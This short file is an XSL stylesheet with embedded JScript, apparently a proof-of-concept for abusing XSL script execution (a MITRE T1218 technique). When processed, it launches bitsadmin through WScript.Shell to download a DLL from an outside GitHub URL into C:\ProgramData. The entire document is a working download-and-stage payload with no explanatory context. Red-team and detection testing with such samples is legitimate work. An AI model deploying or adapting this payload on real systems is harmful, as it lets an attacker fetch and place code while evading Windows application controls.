<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("bitsadmin /create ping bitsadmin /addfile ping https://github.com/greycel/pocs/raw/master/T1218_calc.dll C:\ProgramData\ping.dll bitsadmin /RESUME ping bitsadmin /complete ping");
	]]> </ms:script>
</stylesheet>
